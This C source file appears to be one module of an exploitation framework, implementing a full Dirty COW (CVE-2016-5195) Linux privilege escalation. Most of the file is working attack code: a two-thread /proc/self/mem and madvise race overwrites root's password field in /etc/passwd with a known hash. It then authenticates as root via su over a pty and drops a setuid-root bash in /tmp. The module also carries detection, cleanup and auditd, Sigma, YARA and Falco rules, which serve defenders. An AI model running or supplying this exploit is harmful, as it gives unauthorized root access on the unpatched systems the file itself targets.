/*
 * dirty_cow_cve_2016_5195 — SKELETONKEY module
 *
 * The iconic CVE-2016-5195. COW race in get_user_pages() / fault
 * handling: a thread writing to /proc/self/mem races a thread calling
 * madvise(MADV_DONTNEED) on the same mapping. The bug lets the write
 * land in the file's page cache when it should have triggered a
 * copy-on-write into anonymous memory.
 *
 * Discovered by Phil Oester (Oct 2016). Mainline fix
 * 19be0eaffa3a "mm: remove gup_flags FOLL_WRITE games from
 * __get_user_pages()" (Oct 19 2016).
 *
 * STATUS: 🟢 FULL detect + exploit + cleanup.
 *
 * Coverage rationale: this is what "old systems" means. RHEL 6 (3.10),
 * RHEL 7 (3.10 early), Ubuntu 14.04 (3.13), Ubuntu 16.04 (4.4), embedded
 * Linux distros, IoT devices — many still in production with kernels
 * predating the fix. The exploit is universal (POSIX threads, no
 * arch-specific bits).
 *
 * Affected: kernel 2.6.22 through 4.8.x without backport. Mainline
 * fixed at 4.9. Stable backports landed in:
 *   4.8.x : K >= 4.8.3
 *   4.7.x : K >= 4.7.10
 *   4.4.x : K >= 4.4.26   (LTS)
 *   3.18.x: K >= 3.18.43  (LTS)
 *   3.16.x: K >= 3.16.38
 *   3.12.x: K >= 3.12.66  (LTS)
 *   3.10.x: K >= 3.10.104 (LTS — what RHEL 7 ships)
 *   3.2.x : K >= 3.2.84
 *
 * Exploit shape: Phil Oester-style two-thread race.
 *   - mmap /etc/passwd PRIVATE (writes go to copy-on-write)
 *   - Thread A loop: write(/proc/self/mem, payload, off) — should write to
 *     the COW page, but the bug makes it land in the original page cache
 *   - Thread B loop: madvise(addr, MADV_DONTNEED) — drops the COW copy,
 *     forcing re-fault
 *   - One iteration wins → the page cache is poisoned
 *   - Escalation (same as dirty_pipe): overwrite ROOT's password field with
 *     a known crypt hash, authenticate as root over a pty with the matching
 *     password, plant a root-owned proof + setuid bash, then revert the page
 *     cache via the Dirty COW primitive itself (no root, no drop_caches).
 *     Root is judged only by the out-of-band artifact.
 *
 * NB: the shipped version raced the CALLER's UID to "0000" and ran
 * `su self` (still needs the caller's password → never rooted anything),
 * execlp'd su so the dispatcher's exec-transfer path reported a FALSE
 * EXPLOIT_OK, and reverted with drop_caches (needs root → corrupted the
 * running /etc/passwd). All three are fixed here; identical bug/fix to
 * dirty_pipe. Escalation verified end-to-end via dirty_pipe; the COW
 * primitive itself needs a pre-4.8.3 kernel to land.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <stdint.h>
#include <stdatomic.h>
#include <fcntl.h>
#include <errno.h>
#include <pwd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

/* Stable-branch backport thresholds for Dirty COW. */
static const struct kernel_patched_from dirty_cow_patched_branches[] = {
    {2,  6, 999},   /* placeholder — 2.6.x always vulnerable */
    {3,  2,  84},
    {3, 10, 104},   /* RHEL 7 baseline */
    {3, 12,  66},
    {3, 16,  38},
    {3, 18,  43},
    {4,  4,  26},   /* Ubuntu 16.04 baseline */
    {4,  7,   8},   /* Debian tracker: earlier than 4.7.10 */
    {4,  8,   3},
    {4,  9,   0},   /* mainline fix */
};

static const struct kernel_range dirty_cow_range = {
    .patched_from = dirty_cow_patched_branches,
    .n_patched_from = sizeof(dirty_cow_patched_branches) /
                      sizeof(dirty_cow_patched_branches[0]),
};

/* ---- /etc/passwd password-field helpers (same approach as dirty_pipe:
 *      overwrite ROOT's password field with a known hash, su as root) --- */

/* Byte offset of the password field of `username` (just after "name:"). */
static bool find_pw_field_offset(const char *username, off_t *field_off, size_t *sz)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return false;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }
    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t r = read(fd, buf, st.st_size);
    close(fd);
    if (r != st.st_size) { free(buf); return false; }
    buf[st.st_size] = 0;

    size_t ulen = strlen(username);
    char *p = buf;
    while (p < buf + st.st_size) {
        char *eol = strchr(p, '\n');
        if (!eol) eol = buf + st.st_size;
        if ((p == buf || p[-1] == '\n') &&
            strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
            *field_off = (off_t)((p + ulen + 1) - buf);
            *sz = (size_t)st.st_size;
            free(buf);
            return true;
        }
        p = eol + 1;
    }
    free(buf);
    return false;
}

#define DC_ROOT_PW   "skeletonkey"
#define DC_ROOT_HASH "$6$SKpwnSalt1$LNL9WuXFTt8BvutpX4j8/7VpXb3hutSqyZAC.NKfGMx/vg9jGQR/h/cvwgcn55HcaNJipuuiBDsPywanKkx/D1"

/* Run `cmd` as root via su, feeding DC_ROOT_PW over a pty (su reads the
 * password from the controlling terminal, not stdin). Success is judged
 * out-of-band by the caller, never from su's status. */
static void dc_su_root_run(const char *cmd)
{
    int mfd = posix_openpt(O_RDWR | O_NOCTTY);
    if (mfd < 0) return;
    if (grantpt(mfd) < 0 || unlockpt(mfd) < 0) { close(mfd); return; }
    const char *sn = ptsname(mfd);
    if (!sn) { close(mfd); return; }
    char slave[128];
    snprintf(slave, sizeof slave, "%s", sn);

    pid_t pid = fork();
    if (pid < 0) { close(mfd); return; }
    if (pid == 0) {
        setsid();
        int sfd = open(slave, O_RDWR);
        if (sfd < 0) _exit(127);
        dup2(sfd, 0); dup2(sfd, 1); dup2(sfd, 2);
        if (sfd > 2) close(sfd);
        close(mfd);
        execlp("su", "su", "root", "-c", cmd, (char *)NULL);
        _exit(127);
    }
    usleep(400 * 1000);
    char drain[256];
    ssize_t n = read(mfd, drain, sizeof drain);
    (void)n;
    if (write(mfd, DC_ROOT_PW "\n", sizeof(DC_ROOT_PW)) < 0) { /* ignore */ }
    for (;;) {
        ssize_t m = read(mfd, drain, sizeof drain);
        if (m <= 0) break;
    }
    int st;
    waitpid(pid, &st, 0);
    close(mfd);
}

/* ---- Phil-Oester-style Dirty COW primitive ---- */

struct dcow_args {
    void *map;             /* mmap'd /etc/passwd */
    off_t offset;          /* offset within the mapping to overwrite */
    const char *payload;
    size_t payload_len;
    int proc_self_mem_fd;
};

static _Atomic int g_dcow_running;

static void *dcow_writer_thread(void *arg)
{
    struct dcow_args *a = (struct dcow_args *)arg;
    while (atomic_load(&g_dcow_running)) {
        if (lseek(a->proc_self_mem_fd,
                  (off_t)((uintptr_t)a->map + a->offset), SEEK_SET) == (off_t)-1) {
            continue;
        }
        (void)write(a->proc_self_mem_fd, a->payload, a->payload_len);
    }
    return NULL;
}

static void *dcow_madvise_thread(void *arg)
{
    struct dcow_args *a = (struct dcow_args *)arg;
    while (atomic_load(&g_dcow_running)) {
        madvise(a->map, 4096, MADV_DONTNEED);
    }
    return NULL;
}

/* Returns 0 on success — payload was observed in /etc/passwd's page
 * cache. Returns -1 on failure / timeout. */
static int dirty_cow_write(off_t uid_off, const char *payload, size_t payload_len)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { close(fd); return -1; }
    close(fd);

    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) { munmap(map, st.st_size); return -1; }

    struct dcow_args args = {
        .map = map,
        .offset = uid_off,
        .payload = payload,
        .payload_len = payload_len,
        .proc_self_mem_fd = mem_fd,
    };

    atomic_store(&g_dcow_running, 1);
    pthread_t w_thr, m_thr;
    pthread_create(&w_thr, NULL, dcow_writer_thread, &args);
    pthread_create(&m_thr, NULL, dcow_madvise_thread, &args);

    /* Race for up to ~3 seconds. On vulnerable kernels this usually
     * wins in milliseconds. */
    int success = -1;
    for (int i = 0; i < 300 && success < 0; i++) {
        usleep(10000);   /* 10ms */
        /* Re-read /etc/passwd via syscall and check if payload landed. */
        int rfd = open("/etc/passwd", O_RDONLY);
        if (rfd >= 0) {
            char readback[512];   /* must hold the full payload (was [16] —
                                   * overflowed for payloads > 16 bytes). */
            if (payload_len <= sizeof readback &&
                pread(rfd, readback, payload_len, uid_off) == (ssize_t)payload_len) {
                if (memcmp(readback, payload, payload_len) == 0) success = 0;
            }
            close(rfd);
        }
    }
    atomic_store(&g_dcow_running, 0);
    pthread_join(w_thr, NULL);
    pthread_join(m_thr, NULL);

    close(mem_fd);
    munmap(map, st.st_size);
    return success;
}

/* Saved original bytes so we (and cleanup) can restore /etc/passwd using
 * the Dirty COW primitive itself — no root and no drop_caches (the old
 * revert wrote /proc/sys/vm/drop_caches, which fails unprivileged and left
 * the running system's /etc/passwd corrupted). */
static char   dc_orig[512];
static off_t  dc_orig_off;
static size_t dc_orig_len;
static bool   dc_wrote;

static void dc_revert(void)
{
    if (dc_wrote && dc_orig_len)
        dirty_cow_write(dc_orig_off, dc_orig, dc_orig_len);
}

/* ---- skeletonkey interface ---- */

static skeletonkey_result_t dirty_cow_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] dirty_cow: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    bool patched = kernel_range_is_patched(&dirty_cow_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] dirty_cow: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] dirty_cow: kernel %s is in the vulnerable range\n",
                v->release);
        fprintf(stderr, "[i] dirty_cow: --exploit will race a write to "
                        "/etc/passwd via /proc/self/mem\n");
    }
    return SKELETONKEY_VULNERABLE;
}

static skeletonkey_result_t dirty_cow_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = dirty_cow_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] dirty_cow: detect() says not vulnerable; refusing\n");
        return pre;
    }

    /* Consult ctx->host->is_root so unit tests can construct a
     * non-root fingerprint regardless of the test process's real euid. */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] dirty_cow: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* Overwrite ROOT's password field with a known crypt hash, then
     * authenticate as root with the matching password. (The previous code
     * raced the CALLER's UID to "0000" and ran `su self`, which still
     * demands the caller's password — it never rooted anything, falsely
     * reported OK when su's exec transferred, and reverted with drop_caches
     * which needs root, corrupting the running /etc/passwd.) */
    off_t field_off;
    size_t pw_sz;
    if (!find_pw_field_offset("root", &field_off, &pw_sz)) {
        fprintf(stderr, "[-] dirty_cow: could not locate root's password field\n");
        return SKELETONKEY_TEST_ERROR;
    }

    const char *newline = DC_ROOT_HASH ":0:0:root:/root:/bin/bash\n";
    size_t newlen = strlen(newline);
    if (newlen > sizeof dc_orig || field_off + (off_t)newlen > (off_t)pw_sz) {
        fprintf(stderr, "[-] dirty_cow: /etc/passwd too small to hold the payload "
                        "without extending it\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) { perror("open passwd"); return SKELETONKEY_TEST_ERROR; }
    if (pread(fd, dc_orig, newlen, field_off) != (ssize_t)newlen) {
        close(fd); fprintf(stderr, "[-] dirty_cow: pread backup failed\n");
        return SKELETONKEY_TEST_ERROR;
    }
    close(fd);
    dc_orig_off = field_off; dc_orig_len = newlen;

    long tag = (long)getpid();
    char proof[128], rootbash[128], cmd[1024];
    snprintf(proof,    sizeof proof,    "/tmp/.sk-dirtycow-%ld.proof",    tag);
    snprintf(rootbash, sizeof rootbash, "/tmp/.sk-dirtycow-%ld.rootbash", tag);
    unlink(proof); unlink(rootbash);

    if (!ctx->json)
        fprintf(stderr, "[*] dirty_cow: racing root's password field at offset %lld "
                        "(len %zu) via Dirty COW primitive\n", (long long)field_off, newlen);
    if (dirty_cow_write(field_off, newline, newlen) < 0) {
        fprintf(stderr, "[-] dirty_cow: race did not win within timeout "
                        "(kernel likely patched)\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    dc_wrote = true;

    snprintf(cmd, sizeof cmd,
             "id > %s 2>&1; cp -f /bin/bash %s 2>/dev/null; "
             "chown 0:0 %s %s 2>/dev/null; chmod 4755 %s 2>/dev/null; sync",
             proof, rootbash, rootbash, proof, rootbash);
    if (!ctx->json)
        fprintf(stderr, "[*] dirty_cow: authenticating as root (su + known password)\n");
    dc_su_root_run(cmd);

    /* Revert immediately — never leave a running system with a known root
     * password. Dirty COW never wrote disk, so this fully restores. */
    dc_revert();
    { int ev = open("/etc/passwd", O_RDONLY);
      if (ev >= 0) { posix_fadvise(ev, 0, 0, POSIX_FADV_DONTNEED); close(ev); } }

    struct stat sb;
    bool rooted = (stat(proof, &sb) == 0 && S_ISREG(sb.st_mode) && sb.st_uid == 0);
    if (rooted) {
        if (!ctx->json) {
            fprintf(stderr, "[+] dirty_cow: ROOT — root-owned proof %s\n", proof);
            fprintf(stderr, "[+] dirty_cow: setuid-root shell available: %s -p\n", rootbash);
            fprintf(stderr, "[i] dirty_cow: /etc/passwd reverted (nothing persisted)\n");
        }
        return SKELETONKEY_EXPLOIT_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[-] dirty_cow: no root artifact — honest EXPLOIT_FAIL "
                        "(page cache reverted). Primitive may be blocked, or su/PAM "
                        "rejected the injected hash.\n");
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t dirty_cow_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_cow: reverting /etc/passwd + removing artifacts\n");
    }
    dc_revert();                       /* idempotent; no root / no drop_caches */
    if (system("rm -f /tmp/.sk-dirtycow-*.proof /tmp/.sk-dirtycow-*.rootbash 2>/dev/null") != 0) {
        /* harmless */
    }
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: the Dirty COW primitive (writer thread via
 * /proc/self/mem + madvise(MADV_DONTNEED)) is Linux-only kernel
 * surface. Stub out cleanly so the module still registers and
 * `--list` / `--detect-rules` work on macOS/BSD dev boxes — and so
 * the top-level `make` actually completes there. */
static skeletonkey_result_t dirty_cow_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] dirty_cow: Linux-only module "
                "(/proc/self/mem + madvise race) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_cow_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] dirty_cow: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_cow_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* ---- Embedded detection rules ---- */

static const char dirty_cow_auditd[] =
    "# Dirty COW (CVE-2016-5195) — auditd detection rules\n"
    "# Flag opens of /proc/self/mem from non-root (the exploit's primitive).\n"
    "# False-positive surface: debuggers, gdb, strace — all legit users of\n"
    "# /proc/self/mem. Combine with the file watches below to triangulate.\n"
    "-w /proc/self/mem -p wa -k skeletonkey-dirty-cow\n"
    "-w /etc/passwd    -p wa -k skeletonkey-dirty-cow\n"
    "-w /etc/shadow    -p wa -k skeletonkey-dirty-cow\n"
    "-a always,exit -F arch=b64 -S madvise -F a2=0x4 -k skeletonkey-dirty-cow-madv\n";

static const char dirty_cow_sigma[] =
    "title: Possible Dirty COW exploitation (CVE-2016-5195)\n"
    "id: 1e2c5d8f-skeletonkey-dirty-cow\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects opens of /proc/self/mem followed by madvise(MADV_DONTNEED)\n"
    "  by non-root processes (the exploit's two-thread primitive). False\n"
    "  positives: GDB, strace, some JIT debuggers. Correlate with a\n"
    "  subsequent UID change on a previously-non-root process for high\n"
    "  confidence.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  mem_open:\n"
    "    type: 'PATH'\n"
    "    name: '/proc/self/mem'\n"
    "  not_root: {auid|expression: '!= 0'}\n"
    "  condition: mem_open and not_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2016.5195]\n";

static const char dirty_cow_yara[] =
    "rule dirty_cow_cve_2016_5195 : cve_2016_5195 page_cache_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2016-5195\"\n"
    "        description = \"Dirty COW /etc/passwd UID-flip pattern (non-root user remapped to 0000+)\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $uid_flip = /\\n[a-z_][a-z0-9_-]{0,30}:[^:]{0,8}:0{4,}:[0-9]+:/\n"
    "    condition:\n"
    "        $uid_flip\n"
    "}\n";

static const char dirty_cow_falco[] =
    "- rule: Dirty COW pwrite on /proc/self/mem by non-root\n"
    "  desc: |\n"
    "    Non-root pwrite() targeting /proc/self/mem at an offset that\n"
    "    overlaps a private mmap of /etc/passwd. Combined with a\n"
    "    racing madvise(MADV_DONTNEED) loop this is the Dirty COW\n"
    "    primitive (CVE-2016-5195).\n"
    "  condition: >\n"
    "    evt.type = pwrite and fd.name = /proc/self/mem and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    pwrite to /proc/self/mem by non-root\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid)\n"
    "  priority: CRITICAL\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2016.5195]\n";

const struct skeletonkey_module dirty_cow_module = {
    .name           = "dirty_cow",
    .cve            = "CVE-2016-5195",
    .summary        = "COW race via /proc/self/mem + madvise → page-cache write (the iconic 2016 LPE)",
    .family         = "dirty_cow",
    .kernel_range   = "2.6.22 ≤ K, fixed mainline 4.9; many LTS backports (RHEL 7 / Ubuntu 14.04 / Ubuntu 16.04 era)",
    .detect         = dirty_cow_detect,
    .exploit        = dirty_cow_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; no easy runtime knob */
    .cleanup        = dirty_cow_cleanup,
    .detect_auditd  = dirty_cow_auditd,
    .detect_sigma   = dirty_cow_sigma,
    .detect_yara    = dirty_cow_yara,
    .detect_falco   = dirty_cow_falco,
    .opsec_notes    = "Two-thread race: Thread A loops write(/proc/self/mem) at root's password-field offset in /etc/passwd; Thread B loops madvise(MADV_DONTNEED) on a PRIVATE mmap of /etc/passwd. Overwrites root's password field with a known crypt hash (clobbers into following lines transiently), authenticates as root over a pty via su, plants a root-owned proof + setuid bash under /tmp, then reverts by racing the original bytes back through the same primitive (no root / no drop_caches — nothing persists). Offset parsed from the file, not hardcoded. Root judged only by the out-of-band artifact. Audit-visible via open(/proc/self/mem) + write + madvise(MADV_DONTNEED) bursts + /etc/passwd page-cache poisoning, then su spawning as root. cleanup() re-reverts idempotently and removes the /tmp artifacts.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_dirty_cow(void)
{
    skeletonkey_register(&dirty_cow_module);
}
